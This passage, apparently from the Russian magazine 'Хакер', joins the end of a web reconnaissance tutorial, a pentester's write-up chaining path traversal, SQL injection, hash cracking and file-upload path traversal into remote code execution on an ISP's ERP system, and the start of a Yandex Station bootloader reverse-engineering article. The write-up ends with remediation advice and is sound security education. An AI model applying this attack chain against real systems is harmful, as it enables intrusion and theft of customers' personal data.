карту  приложений в  рамках нашего  скоупа. Затем продолжаем работу
над проектом в Burp.


cat live_url | httpx -http-proxy http://127.0.0.1:8080


СКРИНШОТИМ

Существует множество утилит, которые могут проходить по списку адресов
и делать скриншоты, например httpx, Eyewitness или Aquatone. Лично я пред‐
почитаю использовать GoWitness . В отличие от аналогов, он делает скрин‐
шоты в хорошем качестве, предоставляет более полную сопутствующую
информацию и хранит результаты в базе данных SQLite, что полезно для авто‐
матизации.
   Готовим окружение:


sudo apt install gccgo-go
sudo apt install golang-go
sudo apt install google-chrome
go install github.com/sensepost/gowitness@latest

Скриншотить лучше всего не по списку с доменами, а по списку с открытыми
портами. Это довольно очевидно, но в пылу азарта можно и не заметить, что
делаешь что‑то не то.


gowitness scan file -f web_services.txt --save-content --write-db

Смотрим результаты:


gowitness report serve


ВЫВОДЫ

Мы изучили инструменты и алгоритмы для активной разведки, обработали
собранные пассивно URL-адреса и добавили новые — из ответов веб‑сер‐
висов, результатов работы Katana, а также найденные с помощью перебора
директорий и фаззинга скрытых параметров.
   Также мы поискали виртуальные хосты, собрали структуру веб‑приложе‐
ний в проекте Burp, сформировали списки с JS-файлами, URL-адресами,
в том числе с параметрами, и отсортировали интересные URL по ключевым
словам.
  Под конец мы проанализировали используемые технологии и сделали
скриншоты. Теперь у нас есть ценная информация, которая позволит лучше
понять специфику нашей цели. Это поможет на следующем этапе — активном
сканировании на наличие известных и новых уязвимостей.
ВЗЛОМ





В этой статье я поделюсь историей одного
из выполненных мной проектов, который
показал, что даже в наше время встречают‐
ся простые и базовые уязвимости, грамот‐
                                                                                                baksist
                                                                                                      Singleton Securityное  сочетание которых может  привести
к RCE.


Я  занимаюсь  анализом  защищенности  веб‑приложений  и  внешних
инфраструктур в Singleton Security. Нашим заказчиком выступил довольно
крупный интернет‑провайдер, предоставляющий свои услуги в нескольких
регионах России.
   Суть проекта заключалась в тестировании сравнительно скромного сег‐
мента внешней инфраструктуры заказчика — на старте было предоставлено
всего девять IP-адресов. Скоуп, конечно, небольшой, но, как показывает
практика, даже этого бывает достаточно для весьма интересных находок. Так
произошло и здесь!
  В область тестирования входила корпоративная ERP-система, причем
это был даже не вендорский продукт, а внутренняя разработка. Самописные
решения (еще и для внутреннего использования) особенно интересны тем,
что  к  ним  могут  предъявляться  гораздо  менее  строгие  требования
по безопасности. Вероятность того, что такие системы проходят регулярный
пентест, тем более мала. Собственно, о захвате этой системы я сегодня
и расскажу.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для  специалистов по безопасности,
                          проводящих  тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой  вред,  причиненный с  применением
                           изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.



РАЗВЕДКА, ПЕРВАЯ ЗАЦЕПКА

Первый этап при проведении пентеста — это, конечно же, разведка — поиск
максимального числа поддоменов, веб‑сайтов, служб и сервисов, доступных
в обозначенном скоупе.
   Поэтому в первую очередь я просканировал порты на полученных девяти
IP-адресах, чтобы определить доступные службы.
  Я начал с поиска веб‑приложений на стандартных портах — 80 и 443.
Это помогло быстро очертить базовую поверхность атаки и провести ска‐
нирование без лишнего шума. На тот момент было непонятно, использует ли
заказчик средства защиты и насколько строго они настроены, поэтому я ста‐
рался действовать осторожно.
   Позже я полноценно просканировал весь скоуп, но решил не углубляться
в детали, чтобы не перегружать повествование.
   Команда выглядела так:


nmap -v -Pn -iL scope.txt -p 80,443 --max-rate 20 -oG web-scan.nmap

В результате сканирования я обнаружил три узла с доступными веб‑сер‐
верами. Кроме того, Nmap по умолчанию выполняет обратное разрешение
DNS-имен, поэтому в процессе я также получил используемое доменное имя
(в тексте я буду указывать вместо него example.ru).
   Теперь можно использовать его для поиска поддоменов. Для этого я
обычно пользуюсь инструментарием ProjectDiscovery, в частности утилитами
subfinder и dnsx. Первая предназначена для поиска поддоменов в открытых
источниках, а вторая — для выполнения DNS-запросов, аналог nslookup
или dig. Инструментарий PD примечателен тем, что вывод одной утилиты
можно сразу пайпить на ввод другой. Благодаря этому можно собирать инте‐
ресные комбайны, позволяющие одним однострочником провести разведку,
обнаружить действующие HTTP-сервисы и  сразу же просканировать их
на наличие уязвимостей.
  Но конкретно в этом случае задача проще — найти все поддомены, отно‐
сящиеся к скоупу, поэтому я использовал лишь две упомянутые утилиты:


subfinder -all -silent -d example.ru | dnsx -a -resp -silent -nc

После фильтрации вывода по IP-адресам из скоупа мое внимание привлек
один адрес, в который разрешались около десяти поддоменов. Это был
как раз один из ранее найденных хостов с доступным веб‑интерфейсом.
  Я изучил доступные веб‑приложения и выяснил, что на этом узле раз‐
мещена ERP-система  ( erp.example.ru ).  Большинство поддоменов  ока‐
зались ее копиями для офисов компании в разных городах. Также были дос‐
тупны поддомены с говорящими названиями files и api, судя по всему,
предназначенные для работы с файлами и API-запросами.
   Следующий этап, разумеется, — это фаззинг доступных файлов и дирек‐
торий на обнаруженных веб‑приложениях. Здесь и ждала первая находка:
на поддомене files.example.ru оказался доступен конфиг Nginx.


ПЕРВАЯ УЯЗВИМОСТЬ — ЧИТАЕМ ФАЙЛЫ

Мое внимание сразу же привлекла одна из первых строчек конфига:


location /avatar {
    rewrite ^/avatar/(.*)$ /api.php?type=getAvatar&file=$1 break;
    ...
    fastcgi_pass localhost:9000
}

Здесь можно увидеть, что все маршруты, начинающиеся с /avatar, обра‐
батываются rewrite-правилом, его можно прочитать так: «возьми все, что идет
после /avatar/ , и подставь в аргумент параметра file». То есть если мы обра‐
тимся по пути /avatar/test/example.png, то Nginx превратит это в /api.
php?type=getAvatar&file=test/example.png.
   GET-параметр file вызывает очень большие подозрения на возможный
LFR / Path Traversal, но, если мы подставим нагрузку в изначальный URL,
ничего не произойдет: Nginx обрубает подобные запросы и возвращает
ошибку 400. Но стоит проверить, можно ли обратиться к скрипту api.php
напрямую и подставить нагрузку туда.





Бинго! Теперь есть возможность читать содержимое файлов в системе, дос‐
тупных текущему пользователю, — вероятно, www-data . А еще в конфиге
Nginx был виден эндпоинт, предназначенный для загрузки файлов, но он уже
требовал авторизации (однако он все еще будет полезен в дальнейшем).


НОВЫЙ ПОДДОМЕН

Используя обнаруженную уязвимость, я принялся изучать содержимое фай‐
лов сервера, включая многочисленные конфиги в директории /etc. И тут
всплыла следующая  находка:  настройка зоны (назовем ее example.ru )
для DNS-сервера BIND. В ней — несколько новых поддоменов, которые я
не встречал на этапе разведки, причем они резолвились все в тот же IP-
адрес, с которым я работал. Одним из них был xyz.example.ru , на котором
нашлось новое приложение.
   Главная страница представляла собой форму аутентификации, и никаких
других возможностей доступно не было. Тогда я снова пофаззил файлы
и каталоги. Мое внимание привлек файл config.php. Но это скрипт на PHP,
он выполняется сервером, а не возвращается как файл.
  И тут мне помогла найденная ранее LFR-уязвимость (Local File Read —
возможность читать файлы на удаленном хосте). Так как действие происходит
на одном и том же сервере, оказалось достаточно извлечь файл /var/www/
xyz.example.ru/config.php и ознакомиться с его содержимым.





И снова косяк! Креды от сервиса лежат плейнтекстом в этом файле. Ими‑то я
и воспользовался, чтобы получить доступ к приложению.
   Интерфейс оказался простеньким: это табличка с множеством фильтров.
Как я понял, программа предназначена для просмотра информации об або‐
нентах провайдера: номера договоров, персональные данные абонентов,
статус  подключения.  Уже  достаточно  чувствительные  данные,  доступ
к которым не должен попасть в руки посторонних.
  В этом сервисе для нас главное — это PHP-скрипт, непосредственно
собирающий информацию из БД. Интересен он ровно тем, о чем ты, навер‐
ное, сейчас подумал.





Милая наша золотая кавычка! Сколько скриптов ты поломала и сколько
еще поломаешь.
   Чтобы не гадать и не тратить время на то, как эксплуатировать SQL-инъ‐
екцию, я снова воспользовался LFR и извлек исходный код скрипта.
   Сложно описать боль, которую мне причинило увиденное. 800 строк
отборных  if — else, конкатенация параметров в каждый первый SQL-запрос
и точно такое же формирование HTML-разметки...
   Помимо SQLi, тут еще и риск эксплуатации XSS, если соответствующую
нагрузку можно загрузить со стороны клиента. Впрочем, личный кабинет
не входил в скоуп тестирования, поэтому проверить эту гипотезу не удалось.
  Но вернемся к нашим кавычкам. При таком широком просторе для экспе‐
риментов я выбрал один из самых простых вариантов — запрос к базе
с выполнением классической UNION-инъекции.





Далее тем же способом я извлек схему базы данных — оказалось, это та же
БД, что используется в основной ERP-системе. Поэтому следующим шагом я
изучил таблицы с пользовательскими данными, чтобы понять, удастся ли
получить доступ к какой‑нибудь учетной записи в ERP.


ПОЛУЧАЕМ ДОСТУП В ПРИЛОЖЕНИЕ

И тут меня ждала занятная находка: в таблице пользователей оказалось два
столбца для хранения паролей. Один использовал bcrypt и применялся
для большинства записей — их было около 1500. А вот второй содержал
MD5-хеши без соли и все еще встречался примерно у 200 учеток. Похоже,
разработчики перешли на более надежный алгоритм, но зачем‑то оставили
(или еще не удалили) старый MD5.
   Так или  иначе, это  значительно облегчило мне задачу: из  пример‐
но 200 извлеченных MD5-хешей удалось успешно пробрутить 96. С пароль‐
ной политикой, видимо, все совсем грустно. К тому же многие пароли пов‐
торялись у разных пользователей, так что общее число скомпрометирован‐
ных учеток выросло до 160.
  Я проверил базу и убедился, что среди скомпрометированных учетных
записей оказались пользователи с высокими привилегиями: администра‐
торы, сотрудники техподдержки и несколько ключевых лиц, принимающих
решения в организации.
   Злоумышленник, имеющий подобный уровень доступа, способен нанести
серьезный ущерб организации: извлечь данные сотрудников и клиентов,
нарушить бизнес‑процессы вплоть до полной остановки работы организации.
Возможно, получить доступ к корпоративной инфраструктуре, если и дальше
продолжат встречаться подобные подарки.
   Останавливаться на  достигнутом,  конечно же, не хотелось — вдруг
получится дожать до настоящего пробива, то есть удаленного исполнения
кода?


FINISH HIM!

Виртуальный хост files.example.ru , как ты помнишь, поддерживал загрузку
файлов на сервер, но эта возможность была недоступна без активной сессии
в ERP. Однако теперь у нас есть подходящая учетка благодаря вскрытой
на прошлом шаге базе.
  С помощью ранее найденной «читалки» (то есть LFR) я скачал исходный
код скрипта file.example.ru/api.php, чтобы разобраться в механизме заг‐
рузки и понять, какие параметры нужно передать в POST-запросе. Оказалось,
все довольно просто:
 • POST-запрос на самом деле является PUT-запросом;
 • в параметрах запроса нужно указать src (путь для сохранения), file
   (содержимое файла) и etag (MD5-хеш от file).

Используя эту информацию, собираем запрос на загрузку простого PoC,
выводящего информацию о пользователе и текущей директории.





И вот, кажется, мы успешно загрузили вредоносную нагрузку, осталось лишь
ее вызвать...





Проигрыш. Вместо того чтобы исполнить загруженный PHP-скрипт, сервер
просто вернул его как файл. Чем же это вызвано?
   Объяснение достаточно простое. В конфиге Nginx, который я нашел еще в
самом начале повествования, есть несколько прописанных location (путей),
каждый из которых завершается передачей обработанных аргументов в FPM
(это программный пакет, отвечающий за выполнение PHP-скриптов, так
как сам  веб‑сервер  этого  делать не  умеет) при помощи  директивы
fastcgi_pass. А для всех остальных возможных путей нет обработчика
по умолчанию ( location / ), который передавал бы скрипт на выполнение.
Поэтому загруженный скрипт и выдается обратно как файл.
   Так как все локейшены в конфиге проходили дополнительную обработку
rewrite-правилами, просто изменить имя файла на что‑нибудь, что будет удов‐
летворять одному из паттернов в конфиге, невозможно.
  Но конечно, унывать долго не пришлось. Во‑первых, посмотри, как фор‐
мируется путь для сохранения загруженного файла:


public function getSaveSrc($src)
{
    return $this->getBasePath().'/'.$src;
}

Снова пути складываются без предварительной обработки, снова можно
использовать Path Traversal, только теперь для записи файла в произвольную
директорию. А это очень полезно, так как ранее мы установили, что на иссле‐
дуемом сервере крутится несколько приложений одновременно. А значит,
потенциально существует возможность записать эксплоит в директорию дру‐
гого сайта, из которой он точно выполнится.
   Помимо поддоменов files. и erp. , во время разведки нашелся под‐
домен api.example.ru . Используя все ту же  читалку, я определил, что
исходники сайта лежат в директории /var/www/api.example.ru и эта дирек‐
тория является git-репозиторием (в ней был доступен файл ./.git/index ).
Это значительно упрощает задачу, поскольку позволяет выкачать репози‐
торий целиком, а не фаззингом подбирать пути к существующим файлам.
  Для скачивания исходников я воспользовался утилитой dvcs-ripper. Нес‐
мотря на то что она не обновлялась около пяти лет, тулза отлично справилась
с задачей и смогла вытянуть все необходимые исходники. Другие подобные
тулзы у меня не отрабатывали, поскольку ожидали именно открытую дирек‐
торию .git/ в корне сайта, а не извлечение через Path Traversal.
   Получив исходники, я обнаружил, что в рабочей директории сайта также
есть конфиг Nginx:


location / {
  include snippets/fastcgi-php.conf;
  fastcgi_pass 127.0.0.1:9000;
}

Тут уже все гораздо проще: конфиг  представляет собой единственный
location, который передает все запросы в FPM на исполнение. Это значит, что
если положить эксплоит туда, то он должен успешно выполниться.
  Я повторил загрузку эксплоита, только в этот раз по пути ../../../../
api.example.ru/exploit.php. Открываю загруженный файл, и он выпол‐
няется.





Победа!



Подробнее о  принципах  использованных  уязвимостей  читай  в  статьях
«Хакера»:
 • SQL-инъекции. Разбираем на пальцах одну из самых популярных хакер‐
   ских техник
 • File Inclusion и Path Traversal. Разбираем две базовые веб‑уязвимости




РЕЗУЛЬТАТЫ

В итоге, используя цепочку уязвимостей, я добился выполнения команд ОС
на сервере ERP-системы заказчика. Обнаруженные недостатки позволяют
потенциальному  злоумышленнику  заполучить  персональные данные  сот‐
рудников и клиентов организации, нарушить ее операционную деятельность
или использовать полученные данные для еще более глубокого проник‐
новения в корпоративную инфраструктуру.
   Подобные действия уже были out of scope, поэтому на доказательстве воз‐
можного выполнения команд ОС мне пришлось остановиться. Не сомнева‐
юсь, что с такими находками можно было добраться и до внутряка.


КАК ТАКОГО НЕ ДОПУСТИТЬ

Во‑первых, не совсем ясно, почему такая система была во внешнем контуре:
это  внутренняя  система для использования  сотрудниками  организации,
поэтому по‑хорошему она должна быть помещена за корпоративным VPN.
В таком случае злоумышленникам останется надеяться только на социальную
инженерию и заражение машин сотрудников.
   Во‑вторых, значительную роль в успешной компрометации сервера сыг‐
рало отсутствие изоляции разных сервисов. Грамотная контейнеризация поз‐
волила бы разделить файловые системы разных приложений, что не дало бы
использовать чтение файлов через Path Traversal настолько эффективно.
   Ну и само собой, всегда и везде, во все времена необходимо проверять
и санитизировать пользовательский ввод. Даже если какая‑то возможность
не предназначена для обычных пользователей и «ввода» в простом понима‐
нии там нет, все параметры обязательно должны проходить проверку.
ВЗЛОМ





Эта статья появилась в процессе реверса
прошивок  «Яндекс  Станций». Я  провел
реверс U-Boot процессора умной колонки
и  создал  утилиту  для  его  извлечения
из расшифрованного  загрузчика. Способ              ИнженерNednik
универсален для всех подобных устройств          project@nedosekov.ru
и,  возможно,  других  гаджетов  с чипом
Amlogic.


Разработанный мной метод подойдет:
 • для «Станции Mini2» (YNDX-00020/21);
 • «Станции Lite» (YNDX-00025);
 • «Станции Max» (YNDX-00053/0008);
 • других устройств на Amlogic S905X2 (G12) и A113X (AXG).

В процессе я расскажу о паре интересных плагинов для IDA: с помощью
Diaphora мы позаимствуем информацию из схожего опенсорсного проекта,
а FindCrypt поможет нам отыскать криптографические константы.


U-BOOT LOGIN

Кто подключался к UART «Яндекс Станций», тот наверняка встречал надписи
«RH challenge» и «RH response». На том загрузка колонки прекращается,
девайс нужно перезагрузить или ввести ответ. Запрос всегда разный и явля‐
ется не чем иным, как авторизацией при входе в консоль U-Boot.





Вход в консоль U-Boot происходит прерыванием по какой‑либо клавише, нап‐
ример  Enter или  Ctrl-C  (классический  вариант), далее уже может  пот‐
ребоваться авторизация. Поддерживается стандартный тип авторизации —
bootstopkeysha256 (по хешу пароля). Отличное описание способов приведе‐
но в статье  I hack, U-Boot . «Яндекс» пошел немного дальше стандартного
варианта и добавил свой способ авторизации, дав ему имя Rabbit Hole.
Давай посмотрим, как он устроен.
  Для начала нужно получить прошивку устройства — считать ее с помощью
программатора или любым другим способом. В качестве примера будем изу‐
чать колонку Lite (YNDX-00025). Для извлечения прошивки я использовал ути‐
литу update, разработанную Amlogic для работы со своими загрузчиками
через USB. Она подходит для устройств без пароля. Загрузчик состоит
из двух частей — BL2 и TPL, что соответствует стандартной структуре U-Boot.
   Если ты соберешь U-Boot вручную для чипа A113X, то на выходе получишь
два файла: u-boot.bin.bl2 и u-boot.bin.tpl, оба незашифрованные. У нас
же, к сожалению, используются зашифрованные версии.
   Расшифровать их все‑таки возможно благодаря известной уязвимости .
  Она позволяет расшифровывать загрузочные файлы при подключении
через USB-порт без пароля. На колонках Lite, Mini2 и Max пароль по умол‐
чанию отсутствует, хотя со временем «Яндекс» начал устанавливать его уда‐
ленно. Мне повезло: платы, с которыми я работаю, пока не защищены. Поэто‐
му  я  смогу  воспользоваться  уязвимостью и  расшифровать файл  TPL,
а BL2 для анализа не потребуется.


Строение загрузчика
Для защиты процесса загрузки используется Trusted Firmware с дополнитель‐
ными элементами, в основном касающимися  аппаратных особенностей,
добавляемыми производителем процессора. Первым стартует BL1 (Boot
ROM), жестко прошитый в процессор с завода, — замене он не подлежит.
Следом за ним стартуют другие части:
 • BL2 готовит систему к старту;
 • BL31, BL32 — защищенная часть для обеспечения безопасности;
 • BL33 (U-Boot), который нам и нужен.

Загрузчик начального уровня BL2 нам сейчас неинтересен, а вот TPL содер‐
жит остальные уровни загрузки, в том числе BL33 (U-Boot).
   У колонок Max с процессором Amlogic S905X2 загрузчик представлен
одним файлом — bootloader.bin, который включает все этапы загрузки:
от начальной инициализации до запуска U-Boot. В моделях на чипах A113X
(например, Lite и Mini2) загрузчик разделен на два отдельных файла — с рас‐
ширениями .bl2 и .tpl.


             INFO

                            Такое  объединение  связано  с  особенностями
                          разметки  разделов на  устройствах с памятью
                   eMMC. У Max  загрузчик  хранится  в  разделе
                           bootloader,  тогда как в колонках  Lite и Mini2,
                        использующих  NAND-память,  эти  части  раз‐
                      делены на два независимых раздела — bootloader
                          (содержит BL2) и TPL.


Каждый этап загрузки в прошивке помечен сигнатурой @AML, за которой сле‐
дует заголовок со служебной информацией. Изучив несколько файлов заг‐
рузчиков, я заметил, что последняя по порядку сигнатура @AML соответству‐
ет компоненту BL33. Его отличительная особенность — наличие строки LZ4C,
что указывает на использование сжатия алгоритмом LZ4. Еще один кос‐
венный признак сжатия — «рваные» строки в теле файла.





                                Сигнатуры





                              Неполные строки

Дополнительное  подтверждение  я нашел  в  статье  Фредерика  Бассе,
в которой выполняется упаковка U-Boot через стандартные инструменты
Amlogic со сжатием LZ4.


aml_encrypt_g12a --bl3sig --input u-boot.bin --compress lz4 --output
u-boot.enc --level v3 --type bl33


Пытаемся извлечь U-Boot BL33
Перед нами компонент BL33, давай попробуем извлечь его. Готовых решений
в сети не нашлось, поэтому пришлось разбираться самостоятельно. В качес‐
тве первого шага — самый простой способ: с помощью утилиты dd отрезаем
нужную область файла, а затем пробуем распаковать полученное архивато‐
ром LZ4.





Но нет, данные не подошли, архиватор ругается на испорченный заголовок.
Попытки распаковать другими утилитами или дописать заголовок вручную
не увенчались успехом, метод не подходит. Но в процессе я заглянул в ис‐
ходники LZ4 , с целью найти возможные способы сжатия и примерить к своим
данным.





Изучение  я  начал  с  заголовка,  попытавшись  определить  его  формат
и получить полезные для распаковки данные. В разделе Doc исходников есть
описание двух форматов:
 • LZ4 Block Format — блоки данных;
 • LZ4 Frame Format — заголовки данных.

Описания, которые удалось найти, касаются в основном структуры данных
до и после сжатия, но не содержат информации о начальном заголовке. Тем
не менее кое‑что полезное все же выяснилось: LZ4-распаковка может
работать не только с файлами, но и с буферами, для чего необходимо явно
указывать размеры до и после сжатия. А значит, эти значения должны где‑то
храниться.
   Отложив изучение исходников LZ4, я продолжил поиски — и на одном
из форумов наткнулся на нужную зацепку: ссылку на проект amlogic-boot-fip .
Этот репозиторий, в свою очередь, указывает на три других, где лежат
«разобранные» утилиты Amlogic (именно то, что нужно!):
 • meson-tools — GXBB, GXL и GXM;
 • gxlimg — GXBB, GXL, GXM и AXG;
 • meson64-tools — разработаны для G12B, потенциально могут работать
   с G12A и SM1.

В итоге я остановился на репозитории meson64-tools. В его составе уже есть
библиотека LZ4, а также разобранная утилита подписи bl3sig.c , в которой
наконец‑то нашлось все необходимое: заголовок в виде C-структуры и ука‐
зание на используемый алгоритм сжатия — LZ4HC. Применяя эту структуру
к имеющимся данным, нужно учитывать порядок байтов: в нашем случае про‐
цессор использует little-endian, так что многобайтовые значения нужно читать
в обратном порядке.





Сводка LZ4
В итоге удалось установить, что сигнатура LZ4C обозначает начало заголовка
длиной 0x80 байт, за которым следует сжатый буфер данных. Для сжатия
используется алгоритм LZ4HC, а все необходимые параметры для распаков‐
ки — включая размеры буфера до и после сжатия — уже содержатся внутри
заголовка.


Извлечение
Теперь, когда у нас есть все данные о заголовке и алгоритме, пробуем рас‐
паковать загрузчик. Для этого я набросаю утилиту на C#, он мне наиболее
близок.
   Помимо  стандартных  библиотек,  будем  использовать  пакет  K4os.
Compression.LZ4. Привожу основную часть, а полный исходник ты найдешь
на моем GitHub.


Console.WriteLine("LZ4C найден");


// Считываем размер данных до запаковки
fstream.Seek(0x8 + offset, SeekOrigin.Begin);
fstream.Read(buffer, 0, 4);


var target_size = BitConverter.ToUInt32(buffer, 0);
target = new byte[target_size];
fstream.Read(buffer, 0, 4);


// Считываем размер запакованных данных
source = new byte[BitConverter.ToUInt32(buffer, 0)];
fstream.Seek(0x80 + offset, SeekOrigin.Begin);
// Читаем запакованные данные
fstream.Read(source, 0, source.Length);


// Распаковываем
var decoded = LZ4Codec.Decode(source, 0, source.Length, target, 0,
target.Length);


if (decoded == -1)
{
    throw new InvalidOperationException("Ошибка извлечения. Данные
повреждены");
}


Console.WriteLine("target size {0:x} / source size {1:X} \r\n
Распаковано {2:X}", target.Length, source.Length, decoded);


using (FileStream fstream = new FileStream(out_path, FileMode.
OpenOrCreate))
{
// Преобразуем строку в байты


// Пишем массив байтов в файл
await fstream.WriteAsync(target, 0, target.Length);
Console.WriteLine("Файл записан в файл");
}

Работа  проста, получаем размеры данных до  ( original_size ) и после
( compressed_size) сжатия, считываем сжатые данные одним большим кус‐
ком и передаем на распаковку, после удачного завершения записываем
буфер с распакованными данными в файл. Готово!





Переходим к дизассемблеру
Как видишь, строки теперь не «битые» и IDA/Ghydra теперь может анализи‐
ровать и «разбирать» BL33. Собственно, для этого и нужно было извлечение.





                              Целые строки





                                  IDA

Сразу  скажу, что поправить и затолкать назад U-Boot не выйдет (даже
при наличии ключей шифрования). Да, он запакуется и встроится в прошивку,
но не пройдет проверку из‑за наших изменений, для того‑то и нужен Trusted
Firmware. Однако польза от наших упражнений все‑таки есть: теперь можно
анализировать нетиповые функции, которые в «Яндексе» добавили для своих
устройств, и наконец отыскать Rabbit Hole, а может, даже и нырнуть в нее.


Исследуем и ищем
Чтобы дизассемблер верно обработал прошивку, выбираем архитектуру ARM
little-endian. Базовый адрес и создание секций пока что не настраиваем, при‐
нимаем все параметры по умолчанию. Точка входа находится в самом начале
прошивки, ставим курсор на 0x00 и жмем С — IDA автоматически создаст
довольно много функций.





Всё в автоматическом режиме не распознается, поэтому, пробежавшись
по прошивке вручную, обрабатываем неопределенные участки (в основном
тыкая С) и переходим  к размещению  образа по  правильному  адресу
(базовый адрес), чтобы получить наиболее правильные ссылки на функции
и данные. Определить верный адрес нам помогает лог загрузки колонки:


U-Boot 2015.01 (Sep 29 2023 - 16:13:15)
DRAM: 256 MiB
Relocation Offset is: 0eda0000

Вносим правки через меню Edit → Segments → Rebase Program и указываем
нужное значение. После этих действий увидим изменения. Часть ссылок
ранее была неверно интерпретирована, но теперь все должно соответство‐
вать тому, как U-Boot расположен в памяти устройства.





                             Измененный вид


Поиск норы
Подготовив прошивку к анализу, наконец‑то приступаем к поиску Rabbit Hole.
Из лога загрузки мы знаем текст сообщения: «RH challenge», за него и будем
цепляться. Идем в список строк с надеждой, что там будет ссылка.





Нам повезло, и ссылка действительно есть. Сразу назовем функцию Rabbit
Hole. Выглядит код несложно (всего 63 строки и 5 функций), но все функции
с неизвестными именами, их нужно как‑то различать.





                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИВЗЛОМ
  В КРОЛИЧЬЕЙ НОРЕ
             ШТУРМУЕМ ОТЛАДОЧНУЮ
          КОНСОЛЬ «ЯНДЕКС СТАНЦИИ»





Есть два способа идентифицировать функции:
 1. Зайти в каждую, попытаться проанализировать логику и дать понятное
   название.
 2. Собрать похожую версию ПО с отладочной информацией и при помощи
   плагина Diaphora (есть и другие) поискать стандартные функции, нап‐
  ример printf , sha256 .

Первый способ я применяю в начале изучения, но если вижу возможность
применить второй способ, то обязательно им пользуюсь. Поскольку мы име‐
ем дело с U-Boot, вероятно, большинство функций сможем определить вто‐
рым способом.


ПОДГОТОВКА СРЕДЫ КОМПИЛЯЦИИ U-BOOT

Итак, нам нужно сравнить функции с их аналогами, собранными из исходни‐
ков наиболее близкой версии. Для этого нам нужно установить, какой исполь‐
зовался компилятор и ПО.
  При сборке в секцию данных  включаются  строки с версией U-Boot
и используемого компилятора. Ищем строки U-Boot и GCC (для компилятора)
и находим:
 • aarch64-elf-gcc (Linaro GCC 4.9-2017.01) 4.9.4 ;
 • ld   (Linaro_Binutils-2017.01)   2.24.0.20141017   Linaro
  2014_11-3-git ;
 • U-Boot 2015.01 (Sep 29 2023 - 19:21:39) — то же самое видно
   в логе загрузки.





                               Строка U-Boot





                              Компилятор


Среда сборки
Данные о версии и компиляторе найдены, теперь ищем исходники, качаем
компилятор. Я  буду  использовать  Ubuntu.  Обратимся  к  официальной
документации по сборке U-Boot. Для кросс‑компиляции предлагается такая
последовательность действий:


wget https://releases.linaro.org/archive/13.11/components/toolchain/
binaries/gcc-linaro-aarch64-none-elf-4.8-2013.11_linux.tar.xz
wget https://releases.linaro.org/archive/13.11/components/toolchain/
binaries/gcc-linaro-arm-none-eabi-4.8-2013.11_linux.tar.xz
tar xvfJ gcc-linaro-aarch64-none-elf-4.8-2013.11_linux.tar.xz
tar xvfJ gcc-linaro-arm-none-eabi-4.8-2013.11_linux.tar.xz
export PATH=$PWD/gcc-linaro-aarch64-none-elf-4.8-2013.11_linux/bin:
$PWD/gcc-linaro-arm-none-eabi-4.8-2013.11_linux/bin:$PATH
git clone https://github.com/BayLibre/u-boot.git -b n-amlogic-
openlinux-20170606 amlogic-u-boot
cd amlogic-u-boot
make axg_s400_v1_defconfig
make
export FIPDIR=$PWD/fip

Но версия компилятора здесь отличается от нашей, к тому же их два. Если
с версией все ясно (просто поищем нашу), то с количеством требуется пояс‐
нение:
 • gcc-linaro-arm-none-eabi — для сборки кода, работающего в 32-
   битном режиме ARMv7;
 • gcc-linaro-aarch64-none-elf —  для  сборки под  64-разрядный
  режим AArhc64.

В версии 4.9 наименования немного изменились и, судя по справке, будет
следующее:
 • aarch64-none-elf — gcc-linaro-*x86_64_aarch64-elf.tar.xz
   (Linux 64-bit binaries for the AArch64 bare-metal cross-toolchain);
 • arm-none-eabi — gcc-linaro-*x86_64_arm-eabi.tar.xz (Linux 64-
    bit binaries for the ARMv7 bare-metal cross-toolchain).

Почему две архитектуры? Дело в том, что процессор Amlogic A113X включает
в себя сразу два ядра с разными архитектурами: основное — Cortex-A53,
относящееся к 64-битной архитектуре ARMv8-A (AArch64), и вспомогатель‐
ное — Cortex-M3, использующее 32-битную архитектуру ARMv7-M. Первое
отвечает за основную загрузку и выполнение ОС, второе — за задачи реаль‐
ного времени, вроде управления питанием или работы с аудио.


             INFO

                   gcc-linaro-aarch64-none-elf  я  все же
                         использовал   другой  версии  из‑за  проблем
                       со  сборкой, но  это  в нашем  случае  ничего
                       не изменит.





                         Выдержка из документации

Чтобы упростить рутинные действия при  итерациях сборки, я набросал
небольшой скрипт — так меньше придется стучать по клавишам. Внутри
оставлены закомментированные строки на случай, если понадобится сменить
версию U-Boot или использовать другую версию компилятора arm-none-eabi.
В качестве основы я выбрал репозиторий Khadas — производителя отладоч‐
ных плат, который активно сопровождает нужную нам ветку U-Boot и регуляр‐
но ее обновляет.


#/bin/bash
mkdir ~/lite_uboot
cd ~/lite_uboot
wget https://github.com/khadas/u-boot/archive/refs/tags/khadas-vims-
u-boot-v2015.01-v1.5.2-release.tar.gz
tar xvf khadas-vims-u-boot-v2015.01-v1.5.2-release.tar.gz
#git clone https://github.com/khadas/u-boot.git
#cd ~/lite_uboot1/u-boot
#git checkout  ff7d3af наиболее близкий по дате коммит
mkdir ~/cross_compile
cd ~/cross_compile
wget -c https://releases.linaro.org/components/toolchain/binaries/
latest-4/aarch64-elf/gcc-linaro-4.9.4-2017.01-x86_64_aarch64-elf.tar.
xz
tar xvfJ gcc-linaro-4.9.4-2017.01-x86_64_aarch64-elf.tar.xz
export PATH=$PWD/gcc-linaro-4.9.4-2017.01-x86_64_aarch64-elf/bin:
$PATH
#tar xvfJ gcc-linaro-4.9.4-2017.01-x86_64_arm-eabi.tar.xz
#export PATH=$PWD/gcc-linaro-4.9.4-2017.01-x86_64_arm-eabi/bin:$PATH
wget -c https://releases.linaro.org/archive/13.11/components/
toolchain/binaries/gcc-linaro-arm-none-eabi-4.8-2013.11_linux.tar.xz
tar xvfJ gcc-linaro-arm-none-eabi-4.8-2013.11_linux.tar.xz
export PATH=$PWD/gcc-linaro-arm-none-eabi-4.8-2013.11_linux/bin:$PATH
cd ~/lite_uboot/u-boot-khadas-vims-u-boot-v2015.01-v1.5.2-release
export ARCH= arm
export CROSS_COMPILE=aarch64-elf-
make axg_skt_v1_defconfig
make


             INFO

                   Я не привожу полную инструкцию по настройке
                          среды сборки, так что тебе могут понадобиться
                          дополнительные пакеты и библиотеки.


Результат сборки забираем в папке build , нас интересует файл u-boot. Заг‐
рузим его в «Иду», и она автоматически определит тип ELF 64 bit и проведет
полный анализ. У всех функций есть имена, заполнена информация о сег‐
ментах.





Запускаем Diaphora
Теперь нужно запустить  плагин, который определит сигнатуры и строки
